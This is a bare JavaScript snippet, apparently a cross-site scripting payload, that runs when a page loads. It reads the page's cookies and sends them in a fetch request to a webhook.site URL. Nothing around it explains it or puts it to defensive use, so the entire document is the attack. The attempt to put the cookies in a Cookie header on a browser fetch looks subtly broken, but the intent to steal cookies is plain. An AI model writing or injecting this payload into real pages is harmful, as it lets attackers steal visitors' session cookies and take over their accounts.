document.addEventListener('DOMContentLoaded', () => {
  fetch('https://webhook.site/fbb5de9c-6eb3-4694-9a49-178ec78c1e2f', {
    method: 'GET',
    headers: {
      'Cookie': document.cookie
    }
  });
});
